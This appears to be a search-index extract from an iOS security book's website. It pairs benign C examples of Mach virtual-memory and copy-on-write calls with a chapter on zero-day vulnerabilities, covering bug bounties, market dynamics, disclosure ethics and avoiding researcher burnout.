<pre><code>int vm_example()\n{\n    union data_area {\n        char                *indexed;\n        vm_address_t        handle;\n    } data1, data2;\n\n    vm_size_t               i;\n    vm_size_t               min;\n    mach_msg_type_number_t  data_cnt;\n    mach_port_t             self;\n    char                    *error = NULL;\n    kern_return_t           rv = KERN_SUCCESS;\n\n    printf(\"\\nSTART: vm_example()\\n\");\n\n    self = mach_task_self();\n\n    printf(\"mach_task_self is 0x%x\\n\", self);\n\n    rv = vm_allocate(self,\n                     &amp;data1.handle,\n                     vm_page_size,\n                     TRUE);\n    if (rv != KERN_SUCCESS) {\n        error = \"Could not vm_allocate\";\n        goto vm_example_error_return;\n    }\n\n    for (i = 0; (i &lt; vm_page_size); i++) {\n        data1.indexed[i] = i;\n    }\n    printf(\"Filled space allocated with some data.\\n\");\n    printf(\"Doing vm_read....\\n\");\n    rv = vm_read(self,\n                 data1.handle,\n                 vm_page_size,\n                 &amp;data2.handle,\n                 &amp;data_cnt);\n    if(rv != KERN_SUCCESS) {\n        error = \"Could not vm_read\";\n        goto vm_example_error_return;\n    }\n    printf(\"Successful vm_read.\\n\");\n\n    if (vm_page_size != data_cnt) {\n        error = \"vmread: Number of bytes read not equal to number\n available and requested.\";\n        goto vm_example_logic_error_return;\n    }\n    min = (vm_page_size &lt; data_cnt) ? vm_page_size : data_cnt;\n\n    for (i = 0; (i &lt; min); i++) {\n        if (data1.indexed[i] != data2.indexed[i]) {\n            error = \"Data not read correctly\";\n            goto vm_example_logic_error_return;\n        }\n    }\n    printf(\"Checked data successfully.\\n\");\n\n    rv = vm_deallocate(self,\n                       data1.handle,\n                       vm_page_size);\n    if (rv != KERN_SUCCESS) {\n        error = \"Could not vm_deallocate\";\n        goto vm_example_error_return;\n    }\n\n    rv = vm_deallocate(self,\n                       data2.handle,\n                       data_cnt);\n    if (rv != KERN_SUCCESS) {\n        error = \"Could not vm_deallocate\";\n        goto vm_example_error_return;\n    }\n\n    printf(\"END: vm_example()\\n\");\n    return 0;\n\nvm_example_error_return:\n    printf(\"%s: %s\\n\", error, mach_error_string(rv));\n    return -1;\n\nvm_example_logic_error_return:\n    printf(\"%s\\n\", error);\n    return -1;\n}\n</code></pre>"},{"location":"Mach/#memory-allocation-discussion","title":"Memory Allocation discussion","text":"<p>In our code example, there are two stylistic points to note:</p> <ol> <li> <p>We use a union to clearly characterise that Mach calls accept a handle, which is a <code>vm_address_t</code> but is clearly also just a raw pointer, <code>char *</code>, so we create a union comprising these two types depending on whether we are issuing Mach calls or doing normal C-based pointer arithmetic.  The union avoids us having to use type casts.</p> </li> <li> <p>We use a <code>goto</code> idiom to handle errors.  All our <code>goto</code> statements go forwards (so don't generate loops in our code) and just handle the error cases.  This makes such exception handling clean without too much code repetition.  That is useful because nearly all our function calls can return an error to be checked.</p> </li> </ol> <p>In our code we make the following observations:</p> <ol> <li> <p>We need to have the port of the task before any of the system calls can be made because any message port the system returns is namespaced to port of the task it relates to. <code>mach_task_self()</code> provides us this.  It is not actually a function call, it is a #define which provides us our thread-specific task value.  The value is typically a small integer.</p> </li> <li> <p><code>vm_allocate()</code> allocates memory.  It is logical to ask for a page sized amount of memory because this is the unit of memory upon which virtual protection and management is done.  This will be 16 KiB.</p> </li> <li> <p><code>vm_read()</code> actually also allocates memory as <code>vm_allocate()</code> does.  The function names do not have a nomenclature that tells us this, so it is worthwhile checking the function meaning each time until we are familiar with them.</p> </li> <li> <p><code>vm_deallocate()</code> deallocates our memory; we did a <code>vm_allocate()</code> and a <code>vm_read()</code> allocation so there are two pages of memory to free up.</p> </li> <li> <p>It is a good practice to check return values against <code>!= KERN_SUCCESS</code> and let <code>mach_error_string</code> handle the different possible error return values, since there are many error values possible.</p> </li> </ol> <p>This <code>vm_example()</code> code merely needs to be hooked into our App code when it launches, in the <code>main()</code> function to operate.  It does feel heavyweight for what it does.</p>"},{"location":"Mach/#copy-on-write-memory","title":"Copy-on-Write Memory","text":"<p>The following example shows how Mach will Copy-on-Write pages of memory which are shared.</p> <pre><code>enum copy_on_write_constants {\n    COPY_ON_WRITE = 0,\n    PARENT_CHANGED = 1,\n    CHILD_CHANGED = 2,\n};\n\nenum lock_constants {\n    NO_ONE_WAIT = 0,\n    PARENT_WAIT = 1,\n    CHILD_WAIT = 2\n};\n\nchar *lock_status[] = {\n    \"NO_ONE_WAIT 0\",\n    \"PARENT_WAIT 1\",\n    \"CHILD_WAIT 2\"\n};\n\nchar *cow_status[] = {\n    \"COPY_ON_WRITE 0\" ,\n    \"PARENT_CHANGED 1\",\n    \"CHILD_CHANGED 2\"\n};\n\nint vm_copy_on_write_example()\n{\n    union data_area {\n        char                *indexed;\n        vm_address_t        handle;\n    } lock, mem;\n\n    mach_port_t             self;\n    char                    *error = NULL;\n    kern_return_t           rv = KERN_SUCCESS;\n    pid_t                   pid;\n    const int               MAXDATA = 100;\n\n    printf(\"\\nSTART: vm_copy_on_write_example()\\n\");\n\n    self = mach_task_self();\n\n    rv = vm_allocate(self,\n                     &amp;lock.handle,\n                     sizeof(int),\n                     TRUE);\n    if (rv != KERN_SUCCESS) {\n        error = \"Could not vm_allocate\";\n        goto vm_cow_error_return;\n    }\n\n    rv = vm_inherit(self,\n                    lock.handle,\n                    sizeof(int),\n                    VM_INHERIT_SHARE);\n    if (rv != KERN_SUCCESS) {\n        error = \"Could not vm_inherit\";\n        goto vm_cow_error_return;\n    }\n\n    *lock.indexed = NO_ONE_WAIT;\n\n    rv = vm_allocate(self,\n                     &amp;mem.handle,\n                     sizeof(int) * MAXDATA,\n                     TRUE);\n    if (rv != KERN_SUCCESS) {\n        error = \"Could not vm_allocate\";\n        goto vm_cow_error_return;\n    }\n\n    mem.indexed[0] = COPY_ON_WRITE;\n    printf(\"value of lock before fork: %s\\n\",\n           lock_status[*lock.indexed]);\n    pid = fork();\n\n    if (pid) {\n        printf(\"PARENT: copied memory = %s\\n\",\n               cow_status[mem.indexed[0]]);\n        printf(\"PARENT: changing to %s\\n\",\n               cow_status[PARENT_CHANGED]);\n        mem.indexed[0] = PARENT_CHANGED;\n        printf(\"\\n\");\n        printf(\"PARENT: lock = %s\\n\",\n               lock_status[*lock.indexed]);\n        printf(\"PARENT: changing lock to %s\\n\",\n               lock_status[PARENT_WAIT]);\n        printf(\"\\n\");\n        *lock.indexed = PARENT_WAIT;\n\n        while (*lock.indexed == PARENT_WAIT) {\n            /* wait for child to change the value */\n            ;\n        }\n\n        printf(\"PARENT: copied memory = %s\\n\",\n               cow_status[mem.indexed[0]]);\n        printf(\"PARENT: lock = %s\\n\",\n               lock_status[*lock.indexed]);\n        printf(\"PARENT: Finished.\\n\");\n        *lock.indexed = PARENT_WAIT;\n        exit(-1);\n    }\n\n    while (*lock.indexed != PARENT_WAIT) {\n        /* wait for parent to change lock */\n        ;\n    }\n\n    printf(\"CHILD: copied memory = %s\\n\",\n           cow_status[mem.indexed[0]]);\n    printf(\"CHILD: changing to %s\\n\",\n           cow_status[CHILD_CHANGED]);\n    mem.indexed[0] = CHILD_CHANGED;\n    printf(\"\\n\");\n    printf(\"CHILD: lock = %s\\n\",\n           lock_status[*lock.indexed]);\n    printf(\"CHILD: changing lock to %s\\n\",\n           lock_status[CHILD_WAIT]);\n    printf(\"\\n\");\n\n    *lock.indexed = CHILD_WAIT;\n    while (*lock.indexed == CHILD_WAIT) {\n        /* wait for parent to change lock */\n        ;\n    }\n\n    rv = vm_deallocate(mach_task_self(),\n                       lock.handle,\n                       sizeof(int));\n    if (rv != KERN_SUCCESS) {\n        error = \"vm_deallocate failed\";\n        goto vm_cow_error_return;\n    }\n\n    rv = vm_deallocate(mach_task_self(),\n                       mem.handle,\n                       sizeof(int) * MAXDATA);\n    if (rv != KERN_SUCCESS) {\n        error = \"vm_deallocate failed\";\n        goto vm_cow_error_return;\n    }\n\n    printf(\"CHILD: Finished.\\n\");\n    printf(\"END: vm_copy_on_write_example()\\n\");\n\n    return 0;\n\nvm_cow_error_return:\n    printf(\"%s: %s\\n\", error, mach_error_string(rv));\n    return -1;\n}\n</code></pre> <p>This program produces the following output:</p> <pre><code>START: vm_copy_on_write_example()\nvalue of lock before fork: NO_ONE_WAIT 0\nPARENT: copied memory = COPY_ON_WRITE 0\nPARENT: changing to PARENT_CHANGED 1\n\nPARENT: lock = NO_ONE_WAIT 0\nPARENT: changing lock to PARENT_WAIT 1\n\nCHILD: copied memory = COPY_ON_WRITE 0\nCHILD: changing to CHILD_CHANGED 2\n\nCHILD: lock = PARENT_WAIT 1\nCHILD: changing lock to CHILD_WAIT 2\n\nPARENT: copied memory = PARENT_CHANGED 1\nPARENT: lock = CHILD_WAIT 2\nPARENT: Finished.\nCHILD: Finished.\nEND: vm_copy_on_write_example()\n</code></pre>"},{"location":"Mach/#copy-on-write-discussion","title":"Copy-on-Write Discussion","text":"<p>As we can see the <code>vm_inherit()</code> routine will provide both the child and parent access to the same memory until it is modified.  After that, the child and parent have separate memory pages representing their own copy of the data values which can now be different.</p> <p>This program uses a very primitive form of task coordination: busy while loops.  A realistic example would use the <code>pthread</code> library instead for signalling and coordination.</p>"},{"location":"Mach/#further-steps","title":"Further steps","text":"<p>We now leave the Mach programming introduction.  There aren't really any big example programs that use Mach so it is hard to get an appreciation of how to program with it.  The main Mach program is the XNU kernel itself.  So our next steps on our learning journey is to understand how to debug and probe the XNU kernel.  From this we can get live experience with how Mach works.  We shall see how the system interacts with Mach and how security (Mandatory Access Control (MAC)) is woven into the system at this lowest level.</p>"},{"location":"ZeroDay/","title":"Zero Day","text":""},{"location":"ZeroDay/#what-is-a-zero-day","title":"What is a Zero Day?","text":"<p>A Zero Day Vulnerability is a security vulnerability which is not yet known to the vendor responsible for the platform that has the vulnerability.  Once notified, the \"day\" value increases each day regardless of the action the vendor does.  So a 300-Day vulnerability is one that has been reported to the vendor 300 days ago.  It might have been patched on day 30.  It might have been patched on day 90.  It might never be patched.  Even if it has been patched, a vulnerability disclosed 300 days ago is still a 300-Day vulnerability.</p> <p>As soon as a piece of software (it could also be firmware, a configuration file, resource file, etc.) is written the opportunity for a vulnerability arises.  It could be that no one ever discovers the problem.  Of the set of vulnerabilities that exist, some are found by humans (or their tools).  At that point there is an asymmetry between those that know about the problem and those that do not know about the problem.  Such knowledge can be valuable.  That knowledge is sometimes traded, sold, or shared.  Other times it is kept secret. It is only when the vendor is told about the vulnerability, that the bug is no longer a Zero Day Vulnerability.  The date of disclosure then governs the \"day\" of the vulnerability.</p>"},{"location":"ZeroDay/#bug-bounty-programmes","title":"Bug Bounty Programmes","text":"<p>In order to encourage disclosure of vulnerabilities, vendors sometimes have a bug bounty program.  They can reward researchers with money, or a promise to contribute to a charity, or with fame by acknowledging them as finding the vulnerability.  Since researchers sometimes hoard vulnerabilities so that can do further research unlocked by them, platform owners have responded by giving vetted researchers enhanced access.  In particular, Apple has introduced the Security Research Device programme.</p>"},{"location":"ZeroDay/#market-dynamics","title":"Market Dynamics","text":"<p>Sometimes multiple groups of engineers working separately find the same Zero Day.  Sometimes a researcher suspects a bunch of related Zero Days, but only fully documents one.  Likewise, sometimes the vendor only strictly fixes the vulnerability reported, and leaves adjacent issues as untreated.  That in turn creates a dynamic in the market where recent bug fix releases are scanned for security fixes by researchers, so that adjacent issues can be explored.</p> <p>As the stock of vulnerabilities has increased over time, organisations have sought to organize and catalog such findings.  This gives insights on the kinds of things that can go wrong.  Vendors will improve their game by adding mitigations, which in turn will be researched for weaknesses.  So it is a cat-and-mouse game, getting ever more sophisticated.</p> <p>If we consider \"The Road to Zero\" in dollar terms, where the dollar amount is the equipment cost, human time cost, etc. to achieve a 0-day, we can think of this book as a stepping stone.  Firstly there is the cost to acquiring basic skills.  Then there is the cost to acquiring similar skills but on iOS (Darwin) code bases.  This book reduces that cost.  Finally, there is the cost of finding original 0-days in iOS itself.  We effectively make that final step cheaper because our skills have improved via the earlier steps.</p>"},{"location":"ZeroDay/#market-evolution","title":"Market Evolution","text":"<p>The market dynamics for iOS 0-day vulnerabilities has changed over time due to the changing nature of the Threat Model that Apple face, and the changing role iPhones and other devices have in our lives.  Originally the iPhone had no third party apps.  There were two main threats the system had to model.  First were the Jailbreak community who wanted to customise the iPhone experience and add their own apps.  Second were those that wanted to Carrier-unlock their phone.  The phone price would typically be subsidized by the telecommunications operator via a subscription to their network over a period of time before we were allowed to buy a subscription to another operator.  With such a threat model, a simple layer of defense was needed.  Apple introduced the iPhone App Store, together with sandboxed apps, requiring code-signing for installation for all third party apps.  In those days, a vulnerability alone was enough to defeat the security of the phone.  So finding and exploiting a 0-day was \"most of the game\".</p> <p>Over the ensuing years, Apple would increase the depth of their defenses with new security measures, but bug hunters could keep up.  However, the nature of the market changed.  As there became more apps, and everyday work flows became connected to, and supported by, mobile phone apps, the value of the information in our phone drew the interest of government entities, criminals, and law-enforcement, as well as \"friends\" and family.  Now the threat model is diverse and profound.  The phone must resist attack when in physical possession of an attacker (such as a phone stolen after a crime).  It must resist attack wirelessly when in a hostile network environment, such as an international conference hosting a politicaly sensitive agenda, or an innocent trip to a coffee shop. It must resist attack from a curious partner, grandparent or child.</p> <p>Since iDevices now have many layers of security, it is not one 0-day alone that unlock deeper access to the system.  There are chains of vulnerabilities that need to be exploited to fully attack the system.  Each subsystem has become a complex entity.  So the market is now one of specialization.  One person might be expert in WebKit vulnerabilities.  One person might be expert in PDF file format weaknesses.  One person might now how to construct \"gadgets\" to achieve a desired control flow path.  There are companies that buy up individual vulnerabilities and assemble them.  They might leverage toolkits from others for post-exploitation, etc.</p> <p>No one person is an industry.  We are small players in a complex dynamic market.  So it is important to understand what our goals are, what skills we have or desire, and how we see ourselves in this bigger picture.</p>"},{"location":"ZeroDay/#monetary-rewards","title":"Monetary Rewards","text":"<p>As the skill requirements have increased, together with increased specialization, the monetary cost of \"doing business\" has increased.  This places security researchers in a novel \"taxation\" dynamic; see Why I Love and Don't Love Offensive Work.  Apple will improve their security.  Offensive security companies will need more money to crack into the iDevices as their exploit chains will become longer and more esoteric.  They will need to buy in exploits, research material, and hire from a small pool of talent to do the equivalent in-house.  Such companies will demand higher fees for their tools, and their solutions will have shorter lifetimes.  Law enforcement, military and government entities will need to pay more for such tools.  The pressure release value is at the political level.  Either politicians agree to allowing strong protections in consumer devices, iPhone chiefly among them.  This means taxation on the population (or a re-allocation of funds) to pay the offensive companies more money, and more often, for valuable access to mobile phone information.  Or on the other hand, politicians can espouse back-doors into consumer devices.  This lowers the \"taxation\" but increases malicious activity from adversaries.</p> <p>This explains our current surreal state of affairs.  A vulnerabilty can be worth millions, because it is a tax on millions on users that require confidentiality, security and privacy.</p>"},{"location":"ZeroDay/#ethics","title":"Ethics","text":"<p>There are a lot of ethical consideration surrounding Zero Day Vulnerabilities (hereafter we shall say 0-day).  The consensus is that we should not openly discuss or explain vulnerabilities until the bug is 90 days since disclosure (i.e. a 90-day).  So we don't place 0-days in this text.  But we create software modules of our own, reachable from a non-compromised device.  These modules emulate closely the properties of an exposed subsystem so we can discuss, explore and compromise \"our own code\".  We also discuss past vulnerabilities that have been patched by Apple.</p> <p>Will this book lead to a proliferation of 0-days?  My opinion is that the malicious actors already have the tools and knowledge they need.  It is the wider engineering community that need to up-skill in this area.  Most of these people will not be malicious.  They will enhance and improve the security of systems.</p> <p>In truth, we often tell ourselves stories that make us comfortable with what we are doing, particularly if our pay-cheque aligns with that.  The best of intentions can result in adverse outcomes, as well as the converse.  For example, a researcher working on their PhD might see a bug class, but just have time to explore one fully, writing up a Proof of Concept (POC), which is duly responsibly disclosed, and patched, before being published as a finding by the researcher.  Another engineer might read the write-up, look at the binary diff related to the fix, notice associated vulnerabilities, and produce a variant POC and sell that to a market place for significant money.  At that point, the vulnerability could be combined with others and militarized.  The question is then who made that weapon, and would it have come to existence anyway?  Such a weapon could be used to save lives, lose lives, start conflict or avoid conflict depending on the circumstances politically.</p>"},{"location":"ZeroDay/#arent-security-bugs-just-bugs","title":"Aren't security bugs just bugs?","text":"<p>To take the opposite tack, we can ask ourselves, \"Aren't security bugs just bugs?\"  In other words, why dwell on 0-days as something special.  They are just bugs that can turn out to affect users when exploitable.  But lots of things can affect users.</p> <p>To move forwards with the debate we need to be honest with ourselves.  We need to understand our own perspective and agenda.  If our goal is to learn how to find and discover 0-days, the process of discovery itself is the joy we seek.  If that bug gets an associated vulnerability number, known as a CVE number, then it is a recognition of achievement, much the same as any other professional recognition.</p> <p>We do have to acknowledge the larger context.  Platform owners know that in a large system, there will be bugs, and a subset of those will affect security. The vendor will know that part of their responsibility is patching the bugs when they have been reported.  Their wider responsibility is to have processes that avoid the same issue appearing in the future, and avoid the same bug classes appearing.  They may change their audit procedure, hire staff to search for bugs, provide training on secure programming practices, perform threat modelling sessions, etc.  One fruitful area is applying mitigation layers.  The platform may have checks against stack overflows, or malicious changes to control flow integrity, etc.  These will be discussed later.  In practice, these are powerful weapons.</p> <p>The ultimate perspective is that of an end-user.  Users want to go about their business with the minimal amount of cost, and inconvenience, whilst having a rich and enjoyable user experience.  A secure system which is so cumbersome that there are few users does little to help society.</p> <p>Users need psychological safety, and trust in their systems.  A small drop of poison in a large reservoir wouldn't kill a person, but who would drink water from that reservoir?  Security delivers safety and trust.</p> <p>So security bugs are important, but not special.  They are important because over time platform vendors will develop mitigation layers to sweep away the exploitability of 0-days.  And the platform vendors that do this in a way that minimises the cost and inconvenience to users will win over the greater number of users.  This means that end users will live in a digital world that provides security and trust.  And trust is essential to our modern day living.  </p> <p>When we use public transit systems, we trust the safety of the transport system.  When we stop by a coffee shop and order a drink, we assume the water in the drink is safe.  Wealth is created by a division of labor with individuals doing specialist roles.  Such a society can only function when those services are trustworthy.  Computing services, such as mobile phone systems and apps are a key service that technologists contribute to the wider society.</p> <p>Going back to the example of public transit.  When sitting on a train, we can often see a couple of people drinking coffee.  But we can see plausibly a majority looking at their mobile phone screens.  We need the train to be safe, the coffee to be safe, and the mobile computing experience to be safe!</p>"},{"location":"ZeroDay/#burn-out","title":"Burn Out","text":"<p>We haven't even started yet, and so why are we bringing up the topic of burn out?</p> <p>When we start training our mind to think like a machine thinks, or start working through the details of a subsystem in great deal, it can be both engaging and exhausting. After a period of youthful exuberance we can fall into despair when we can nearly solve something, but cannot quite get it done.</p> <p>As ever, there is a way to hack around such problems!  </p>"},{"location":"ZeroDay/#looking-after-the-body","title":"Looking after the body","text":"<p>First, the boring stuff.  Solid, regular and good-quality sleep.  Three good meals a day.  30 minutes exercise a day - a good walk for example.  These are the basics for maintaining our health.  At least for now, humans are not machines, and humans need this basic level of care.</p>"},{"location":"ZeroDay/#optimizing-the-mind","title":"Optimizing the mind","text":"<p>Second, the mind hack.  That first hour of the day, maybe the first half hour is the golden time.  Save the heaviest and most difficult mental task to only that dream slot.  Leave the manual, boring and tedious investigation work to the end of our work day.  Everything else sits in-between those two things.</p>"},{"location":"ZeroDay/#smoothing-the-ups-and-downs","title":"Smoothing the ups and downs","text":"<p>Third, the multi-tasking hack.  If security research is the only thing we are doing, then yes we have focus but we are going to have ups and downs.  The way around that is to have two activities that vary in importance over a period of months but are a constant presence.  One good parallel activity is software engineering.  We could be writing a security tool, for example, or something unrelated.  Software engineering is in some ways the opposite of vulnerability research.  It is building abstractions, adding layers, and working in a problem domain instead of the machine domain.  It feels very constructive and creative.  Sometimes we make great progress on our software, and other times we make progress on our vulnerability research.  Since time away from one task does not stop our mind from advancing it in our the background, the net effect is that when we're done with vulnerability research, the software engineering seems to go great due to pent up ideas we've been working on in the background.  The converse applies also, so that after a period of development on our software project, new ideas appear to help advance our security research.</p>"},{"location":"ZeroDay/#using-version-control-to-contain-complexity","title":"Using version control to contain complexity","text":"<p>The fourth hack is facilitated by the git version control system.  Everything we do must be recorded and tracked with git (or another version control system).  Because with git, we can make small incremental improvements (git commits), and then build on those.  This provides head space we need to achieve complex things.  We just keep incrementally developing our ideas, code, and experiments.  Do not try and keep complexity in our mind for a long period.  Just keep dumping them into text files, code, etc., into a git repository.  Then at the end of each day, we will feel that we made progress, even if there is no big result.  That will save our sanity.</p>"},{"location":"ZeroDay/#resources","title":"Resources","text":"<p>To complement the book, there is a website of resources which is intended to be used alongside the printed material so example projects can be setup and experimented with.  All references in this book are collected into the Bibliography Chapter at the end of the book.  There we will find URLs to resources, for example.</p> <p>The GitHub website supporting the book is at The Road to Zero on GitHub</p>"}]}